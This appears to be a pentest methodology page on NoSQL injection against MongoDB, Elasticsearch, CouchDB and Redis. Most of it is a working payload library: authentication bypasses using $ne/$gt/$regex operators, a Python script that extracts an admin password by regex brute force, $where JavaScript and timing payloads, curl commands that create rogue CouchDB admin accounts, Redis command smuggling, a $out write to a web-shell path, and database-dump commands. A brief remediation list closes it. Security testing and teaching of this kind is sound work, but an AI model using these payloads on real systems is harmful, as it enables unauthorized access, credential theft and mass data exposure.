---
title: "NoSQL Injection"
date: 2026-02-24
draft: false
---

# NoSQL Injection

> **Severity**: Critical | **CWE**: CWE-943
> **OWASP**: A03:2021 – Injection

---

## What Is NoSQL Injection?

NoSQL databases (MongoDB, CouchDB, Redis, Cassandra, Elasticsearch) use query languages different from SQL — often JSON/BSON objects or key-value structures. Injection occurs when user input is interpreted as **query operators** rather than data. MongoDB is the most commonly exploited.

```
SQL analog:
  SELECT * FROM users WHERE user = 'admin' AND pass = 'INJECTED';

MongoDB analog (operator injection):
  db.users.find({ user: "admin", pass: {$gt: ""} })
  // $gt: "" → password > empty string → matches any non-empty password
```

Two main injection styles:
- **Operator injection** — inject MongoDB query operators (`$gt`, `$regex`, `$where`, etc.)
- **Syntax injection** — break out of string context in server-side JS expressions

---

## Discovery Checklist

- [ ] Identify JSON-based API endpoints accepting login/search/filter parameters
- [ ] Test URL parameters and JSON body fields with `[$gt]=` style payloads
- [ ] Test for error messages revealing MongoDB query structure
- [ ] Detect database type from error messages (`MongoError`, `CouchDB`, `ElasticSearch`)
- [ ] Try `$where` JavaScript injection (server-side JS must be enabled in MongoDB)
- [ ] Test array notation: `param[]=value`, `param[$gt]=`
- [ ] Test for authentication bypass via operator injection
- [ ] Check GraphQL endpoints (often backed by MongoDB)
- [ ] Test blind injection via timing (`$where: "sleep(1000)"`)
- [ ] Test Elasticsearch `_search` endpoint with `script` injection
- [ ] Check Redis SSRF via Gopher protocol
- [ ] Look for debug endpoints exposing raw queries

---

## Payload Library

### Payload 1 — MongoDB Auth Bypass (Operator Injection)

When a login form submits JSON or the backend builds a MongoDB query from user input:

```bash
# If backend does: db.users.find({username: req.body.user, password: req.body.pass})

# URL-encoded form POST injection:
username=admin&password[$ne]=wrongpassword
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid    # login as first user
username=admin&password[$regex]=.*             # regex matches anything

# JSON body injection (Content-Type: application/json):
{"username": "admin", "password": {"$ne": "wrong"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$exists": true}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}

# Curl examples:
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":"invalid"}}'

# URL-param style (common in Express/Mongoose with query-string parsing):
curl "https://target.com/login?username=admin&password[$ne]=x"
```

### Payload 2 — Boolean-Based Data Extraction via `$regex`

Extract data character-by-character using `$regex` with success/failure response difference.

```bash
# Determine if admin password starts with 'a':
{"username": "admin", "password": {"$regex": "^a"}}
# → 200 OK (logged in) = starts with 'a'
# → 401 Unauthorized = doesn't start with 'a'

# Enumerate full password:
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}

# Automate with Python:
python3 -c "
import requests, string

url = 'https://target.com/api/login'
chars = string.ascii_letters + string.digits + '!@#\$%^&*'
known = ''

while True:
    found = False
    for c in chars:
        payload = {'username': 'admin', 'password': {'\$regex': '^' + known + c}}
        r = requests.post(url, json=payload)
        if r.status_code == 200:
            known += c
            print(f'Found: {known}')
            found = True
            break
    if not found:
        print(f'Complete: {known}')
        break
"
```

### Payload 3 — `$where` JavaScript Injection (Server-Side JS)

```javascript
// If MongoDB has server-side JS enabled and $where is used:
// db.users.find({$where: "this.username == '" + input + "'"})

// Classic injection — always true:
' || '1'=='1
' || 1==1//
'; return true; var x='

// Sleep/timing detection:
'; sleep(5000); var x='
' || (function(){var d=new Date();while(new Date()-d<5000);})()||'

// Data exfiltration via timing:
// Extract password char by char based on response time:
' || (this.password[0]=='a' && function(){var d=new Date();while(new Date()-d<2000);}()) || '

// In JSON payload:
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
{"$where": "sleep(5000)"}
{"$where": "function(){return true;}"}
```

### Payload 4 — Array Injection / Parameter Pollution

```bash
# PHP/Node.js array parameter handling:
# username[]=admin&username[]=root → db.find({username: ["admin","root"]})
# password[$ne]=x → db.find({password: {$ne: "x"}})

# Express.js qs library parses [] and [$op] in query strings
# Test login:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user=admin&pass[$ne]=wrong

# In path parameters:
GET /api/users/admin[$ne]void

# JSON array in body:
{"ids": ["1", "2", {"$gte": "0"}]}   # inject into array-accepting field
```

### Payload 5 — Elasticsearch Injection

```bash
# Elasticsearch uses JSON query DSL — script-based injection:

# Basic search (no injection):
POST /index/_search
{"query": {"match": {"field": "value"}}}

# Script injection (if user controls query structure):
POST /index/_search
{
  "query": {
    "script": {
      "script": {
        "source": "System.exit(1)",   # crash
        "lang": "groovy"               # older ES versions used Groovy
      }
    }
  }
}

# Painless script (modern ES — sandboxed but test edge cases):
{"script": {"source": "params['value']", "lang": "painless"}}

# Wildcard query with deep nesting bypass:
{"query": {"wildcard": {"field": {"value": "*", "boost": 1.0}}}}

# Boolean injection — force all documents to match:
{"query": {"bool": {"must": [{"match_all": {}}]}}}

# Aggregation injection — extract all data:
{"aggs": {"all": {"terms": {"field": "sensitive_field.keyword", "size": 10000}}}}
```

### Payload 6 — CouchDB REST API Injection

```bash
# CouchDB is HTTP REST — no query language injection but URL-based issues

# List all databases (if _all_dbs exposed):
curl http://target.com:5984/_all_dbs

# Read any document without auth (if public):
curl http://target.com:5984/DATABASE_NAME/DOCUMENT_ID

# Admin party (no auth configured):
curl -X PUT http://target.com:5984/_config/admins/newadmin -d '"password"'

# Create admin user via /_users:
curl -X PUT http://target.com:5984/_users/org.couchdb.user:attacker \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","password":"pass123","roles":["_admin"],"type":"user"}'

# Mango query injection (CouchDB >= 2.0):
POST /_find HTTP/1.1
{"selector": {"type": {"$eq": "user"}}}  # dumps all users
{"selector": {"$or": [{"type":"user"},{"type":"admin"}]}}
```

### Payload 7 — Redis Injection via SSRF (Gopher)

```bash
# Redis commands via SSRF with gopher:// protocol:
# (See 16_SSRF.md for full gopher payloads)

# If application passes user input to Redis directly:
# KEYS * → dump all keys
# GET admin_token
# SET session_abc123 admin

# Command injection in Redis key patterns:
# If app does: KEYS user:PREFIX* where PREFIX = user input
key=* KEYS *\r\nSET session_pwn admin\r\n

# Lua scripting injection (if EVAL enabled):
EVAL "return redis.call('keys','*')" 0
EVAL "return redis.call('set','hacked','1')" 0
```

### Payload 8 — MongoDB Aggregation Pipeline Injection

```bash
# If app builds aggregation pipeline from user input:
# db.users.aggregate([{$match: {dept: USER_INPUT}}])

# Inject pipeline stages:
# Close $match and add $lookup for data exfiltration:
{"dept": {"$match": {}}, "$lookup": {"from": "users", "as": "all"}}

# Inject $out to write to file (if permissions allow):
[{"$out": "/var/www/html/shell.php"}]

# Conditional injection:
{"$cond": [{"$eq": ["$role", "admin"]}, "$$ROOT", null]}
```

---

## Tools

```bash
# NoSQLMap — automated NoSQL injection tool:
git clone https://github.com/codingo/NoSQLMap
python3 nosqlmap.py

# nosql-injector:
pip3 install nosql-injector

# Burp Suite:
# - Manual testing via Repeater
# - Intruder with NoSQL operator wordlists
# - Extension: "Retire.js" to identify vulnerable MongoDB versions

# MongoDB shell (if you have credentials or auth bypass):
mongo mongodb://target.com:27017/dbname --eval "db.users.find().limit(10)"
mongodump --uri="mongodb://target.com:27017/dbname" --out=/tmp/dump

# Elasticsearch enumeration:
curl -s http://target.com:9200/_cat/indices?v     # list all indices
curl -s http://target.com:9200/_cat/nodes?v       # node info
curl -s http://target.com:9200/INDEX/_mapping     # field mapping
curl -s "http://target.com:9200/INDEX/_search?q=*&size=100"  # dump all

# Redis CLI:
redis-cli -h target.com -p 6379
redis-cli -h target.com INFO
redis-cli -h target.com KEYS "*"

# Wordlist for NoSQL operators:
# /usr/share/seclists/Fuzzing/Databases/NoSQL.txt
ffuf -u https://target.com/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt
```

---

## Remediation Reference

- **Never concatenate user input into MongoDB queries** — use parameterized drivers
- **Disable `$where` and server-side JavaScript**: `--noscripting` flag in mongod
- **Input validation**: reject keys starting with `$`, reject objects when string expected
- **Type checking**: if expecting a string, `assert typeof input === 'string'` before use
- **Mongoose schema typing**: `String` fields reject object input automatically
- **Elasticsearch**: disable dynamic scripting, restrict script languages to `painless` only
- **Redis**: bind to localhost only, require AUTH password, use ACL lists
- **Principle of least privilege**: DB user should not have write/admin permissions for read-only operations

*Part of the Web Application Penetration Testing Methodology series.*
